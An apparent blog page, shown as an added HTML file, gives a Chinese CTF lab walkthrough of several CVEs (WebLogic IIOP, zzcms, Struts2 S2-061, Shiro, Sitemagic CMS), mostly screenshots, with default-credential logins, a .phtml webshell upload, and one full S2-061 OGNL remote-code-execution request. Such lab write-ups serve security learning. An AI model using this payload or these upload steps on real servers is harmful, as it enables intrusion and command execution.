@@ -1,0 +1,375 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>ctf-4 | Hexo</title>
+
+  <!-- keywords -->
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="WEBCVE-2020-2551 Weblogic iiop协议 反序列化  靶标介绍： 2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。 访问页面  使用Liqun工具箱  执行命令  获取flag值  CVE-202">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctf-4">
+<meta property="og:url" content="http://example.com/2023/10/16/ctf-4/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="WEBCVE-2020-2551 Weblogic iiop协议 反序列化  靶标介绍： 2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。 访问页面  使用Liqun工具箱  执行命令  获取flag值  CVE-202">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195322572.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195400344.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195417756.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195651492.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195818868.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195852186.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015201533738.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015201447116.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015201725466.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015201742649.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015201757757.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015202758261.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015202847182.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015203830976.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015211051018.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015211351902.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015211311830.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015221141350.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015221344865.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015221423571.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015221509188.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231015221537823.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231016105938270.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/image-20231016155520504.png">
+<meta property="og:image" content="http://example.com/2023/10/16/ctf-4/1.png">
+<meta property="article:published_time" content="2023-10-16T02:58:27.000Z">
+<meta property="article:modified_time" content="2023-10-17T02:53:37.461Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2023/10/16/ctf-4/image-20231015195322572.png">
+  
+    <link rel="alternative" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/img/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+
+  
+<script src="//cdn.bootcss.com/require.js/2.3.2/require.min.js"></script>
+
+  
+<script src="//cdn.bootcss.com/jquery/3.1.1/jquery.min.js"></script>
+
+
+  
+<meta name="generator" content="Hexo 5.2.0"></head>
+<body>
+  <div id="container">
+    <div id="particles-js"></div>
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+				<img lazy-src="" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+			<h1 class="header-author"><a href="/">John Doe</a></h1>
+		</hgroup>
+
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">Home</a></li>
+				        
+							<li><a href="/archives">Archives</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="half-header-menu">
+						<a class="hide">Home</a>
+						<a>Tags</a>
+						<a>Links</a>
+						<a>About</a>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+						</div>
+						<!-- music -->
+						
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/ActiveMQ/" style="font-size: 10px;">ActiveMQ</a> <a href="/tags/ActiveMQ-CVE-2015-5254/" style="font-size: 10px;">ActiveMQ CVE-2015-5254</a> <a href="/tags/CVE-2021-21311-CVE-2021-43008/" style="font-size: 10px;">CVE-2021-21311 CVE-2021-43008</a> <a href="/tags/CVE-2021-25646/" style="font-size: 10px;">CVE-2021-25646</a> <a href="/tags/SQL/" style="font-size: 10px;">SQL</a> <a href="/tags/airflow/" style="font-size: 10px;">airflow</a> <a href="/tags/apisix/" style="font-size: 10px;">apisix</a> <a href="/tags/appweb-aria2/" style="font-size: 10px;">appweb aria2</a> <a href="/tags/couchdb/" style="font-size: 10px;">couchdb</a> <a href="/tags/csrf-ssrf/" style="font-size: 10px;">csrf ssrf</a> <a href="/tags/dns-dubbo/" style="font-size: 10px;">dns dubbo</a> <a href="/tags/php/" style="font-size: 20px;">php</a> <a href="/tags/php-mysql/" style="font-size: 15px;">php;mysql</a> <a href="/tags/xss/" style="font-size: 10px;">xss</a> <a href="/tags/%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5-%E5%AE%BD%E5%AD%97%E8%8A%82-POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5-%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5-%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6-WAF-SQLMAP/" style="font-size: 10px;">堆叠注入,宽字节,POST注入,HTTP头注入,二次注入,写入文件,WAF,SQLMAP</a> <a href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" style="font-size: 20px;">春秋云镜</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="https://github.com/">github</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">I&#39;m a developer.</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide"></h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+				<img lazy-src="" class="js-avatar">
+			</div>
+			<hgroup>
+			  <h1 class="header-author"></h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">Home</a></li>
+		        
+					<li><a href="/archives">Archives</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+      <div class="body-wrap"><article id="post-ctf-4" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2023/10/16/ctf-4/" class="article-date">
+  	<time datetime="2023-10-16T02:58:27.000Z" itemprop="datePublished">2023-10-16</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      ctf-4
+      
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C/" rel="tag">春秋云镜</a></li></ul>
+	</div>
+
+        
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h3 id="CVE-2020-2551"><a href="#CVE-2020-2551" class="headerlink" title="CVE-2020-2551"></a>CVE-2020-2551</h3><ul>
+<li>Weblogic iiop协议 反序列化</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>2020年1月15日,Oracle发布了一系列的安全补丁,其中Oracle WebLogic Server产品有高危漏洞,漏洞编号CVE-2020-2551,CVSS评分9.8分,漏洞利用难度低,可基于IIOP协议执行远程代码。</p>
+<p>访问页面</p>
+<p><img src="image-20231015195322572.png" alt="image-20231015195322572"></p>
+<p>使用Liqun工具箱</p>
+<p><img src="image-20231015195400344.png" alt="image-20231015195400344"></p>
+<p>执行命令</p>
+<p><img src="image-20231015195417756.png" alt="image-20231015195417756"></p>
+<p>获取flag值</p>
+<p><img src="image-20231015195651492.png" alt="image-20231015195651492"></p>
+<h3 id="CVE-2020-19961"><a href="#CVE-2020-19961" class="headerlink" title="CVE-2020-19961"></a>CVE-2020-19961</h3><ul>
+<li>zz cms 2019 存在sql注入漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>zz cms 2019 subzs.php 存在sql注入漏洞</p>
+<p>访问页面</p>
+<p><img src="image-20231015195818868.png" alt="image-20231015195818868"></p>
+<p>直接根据提示访问页面subzs.php，发现不是直接访问的</p>
+<p><img src="image-20231015195852186.png" alt="image-20231015195852186"></p>
+<p>进入后台，使用admin/admin成功进入，随便找一个文件上传点</p>
+<p><img src="image-20231015201533738.png" alt="image-20231015201533738"></p>
+<p>抓包，将文件后缀修改为phtml，然后新建标签页访问</p>
+<p><img src="image-20231015201447116.png" alt="image-20231015201447116"></p>
+<p>接着使用蚁剑连接</p>
+<p><img src="image-20231015201725466.png" alt="image-20231015201725466"></p>
+<p><img src="image-20231015201742649.png" alt="image-20231015201742649"></p>
+<p>获取flag值</p>
+<p><img src="image-20231015201757757.png" alt="image-20231015201757757"></p>
+<h3 id="CVE-2020-17530"><a href="#CVE-2020-17530" class="headerlink" title="CVE-2020-17530"></a>CVE-2020-17530</h3><ul>
+<li>S2-061</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>对CVE-2019-0230的绕过，Struts2官方对CVE-2019-0230的修复方式是加强OGNL表达式沙盒，而CVE-2020-17530绕过了该沙盒。当对标签属性中的原始用户输入进行评估时，强制 OGNL 评估可能会导致远程代码执行。 POST name:)</p>
+<p>访问页面</p>
+<p><img src="image-20231015202758261.png" alt="image-20231015202758261"></p>
+<p>尝试抓包</p>
+<p><img src="image-20231015202847182.png" alt="image-20231015202847182"></p>
+<p>发送给重发器</p>
+<p><img src="image-20231015203830976.png" alt="image-20231015203830976"></p>
+<p>数据包</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.action HTTP&#x2F;1.1</span><br><span class="line">Host: eci-2ze36c9cztgk0yhyjf60.cloudeci1.ichunqiu.com:8080</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko&#x2F;20100101 Firefox&#x2F;118.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;avif,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http:&#x2F;&#x2F;eci-2ze36c9cztgk0yhyjf60.cloudeci1.ichunqiu.com:8080&#x2F;</span><br><span class="line">Cookie: _ga&#x3D;GA1.2.659862200.1697203384; _ga_J1DQF09WZC&#x3D;GS1.2.1697203384.1.0.1697203384.0.0.0; JSESSIONID&#x3D;B15FDBFC53D3EE5FC045B8657392F574</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Length: 838</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;name&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&#123;(#instancemanager&#x3D;#application[&quot;org.apache.tomcat.InstanceManager&quot;]).(#stack&#x3D;#attr[&quot;com.opensymphony.xwork2.util.ValueStack.ValueStack&quot;]).(#bean&#x3D;#instancemanager.newInstance(&quot;org.apache.commons.collections.BeanMap&quot;)).(#bean.setBean(#stack)).(#context&#x3D;#bean.get(&quot;context&quot;)).(#bean.setBean(#context)).(#macc&#x3D;#bean.get(&quot;memberAccess&quot;)).(#bean.setBean(#macc)).(#emptyset&#x3D;#instancemanager.newInstance(&quot;java.util.HashSet&quot;)).(#bean.put(&quot;excludedClasses&quot;,#emptyset)).(#bean.put(&quot;excludedPackageNames&quot;,#emptyset)).(#arglist&#x3D;#instancemanager.newInstance(&quot;java.util.ArrayList&quot;)).(#arglist.add(&quot;cat &#x2F;flag&quot;)).(#execute&#x3D;#instancemanager.newInstance(&quot;freemarker.template.utility.Execute&quot;)).(#execute.exec(#arglist))&#125;</span><br><span class="line">------WebKitFormBoundaryl7d1B1aGsV2wcZwF--</span><br></pre></td></tr></table></figure>
+
+<h3 id="CVE-2020-13933"><a href="#CVE-2020-13933" class="headerlink" title="CVE-2020-13933"></a>CVE-2020-13933</h3><ul>
+<li>Shiro &lt; 1.6.0 验证绕过漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>Apahce Shiro 由于处理身份验证请求时出错 存在权限绕过漏洞，远程攻击者可以发送特制的HTTP请求，绕过身份验证过程并获得对应用程序的未授权访问。</p>
+<p><img src="image-20231015211051018.png" alt="image-20231015211051018"></p>
+<p>根据页面上的提示，直接抓包</p>
+<p><img src="image-20231015211351902.png" alt="image-20231015211351902"></p>
+<p>发送给重发器，添加/admin/{anything}</p>
+<p><img src="image-20231015211311830.png" alt="image-20231015211311830"></p>
+<h3 id="CVE-2019-9042"><a href="#CVE-2019-9042" class="headerlink" title="CVE-2019-9042"></a>CVE-2019-9042</h3><ul>
+<li>Sitemagic CMS v4.4 任意文件上传漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>Sitemagic CMS v4.4 index.php?SMExt=SMFiles 存在任意文件上传漏洞，攻击者可上传恶意代码执行系统命令</p>
+<p>访问页面</p>
+<p><img src="image-20231015221141350.png" alt="image-20231015221141350"></p>
+<p>登录</p>
+<p><img src="image-20231015221344865.png" alt="image-20231015221344865"></p>
+<p>尝试admin\admin，成功进入后台</p>
+<p><img src="image-20231015221423571.png" alt="image-20231015221423571"></p>
+<p>上传文件</p>
+<p><img src="image-20231015221509188.png" alt="image-20231015221509188"></p>
+<p>上传成功</p>
+<p><img src="image-20231015221537823.png" alt="image-20231015221537823"></p>
+<p>访问相关文件路径</p>
+<p><img src="image-20231016105938270.png" alt="image-20231016105938270"></p>
+<h3 id="CVE-2019-12422"><a href="#CVE-2019-12422" class="headerlink" title="CVE-2019-12422"></a>CVE-2019-12422</h3><ul>
+<li>Shiro &lt; 1.4.2 cookie oracle padding漏洞</li>
+</ul>
+<p><em>靶标介绍：</em></p>
+<p>Apache Shiro是美国阿帕奇（Apache）软件基金会的一套用于执行认证、授权、加密和会话管理的Java安全框架。 Apache Shiro 1.4.2之前版本中存在安全漏洞。当Apache Shiro使用了默认的‘记住我’配置时，攻击者可利用该漏洞对cookies实施填充攻击。</p>
+<p>访问页面</p>
+<p><img src="image-20231016155520504.png" alt="image-20231016155520504"></p>
+<p>使用工具</p>
+<p><img src="1.png" alt="1"></p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/10/29/vulhub%E5%A4%8D%E7%8E%B0/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">&lt;</strong>
+      <div class="article-nav-title">
+        
+          vulhub复现
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/10/15/ctf-3/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ctf-3</div>
+      <strong class="article-nav-caption">&gt;</strong>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+
+
+
+
+</div>
+      <footer id="footer">
+  <div class="outer">
+    <div id="footer-info">
+      <div class="footer-left">
+        &copy; 2023 John Doe
+      </div>
+        <div class="footer-right">
+          <a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/preccrep/hexo-theme-jelly" target="_blank">Jelly</a>
+        </div>
+    </div>
+  </div>
+</footer>
+    </div>
+    
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+
+
+<script>
+	var yiliaConfig = {
+		fancybox: true,
+		mathjax: false,
+		animate: true,
+		isHome: false,
+		isPost: true,
+		isArchive: false,
+		isTag: false,
+		isCategory: false,
+		open_in_new: false
+	}
+</script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
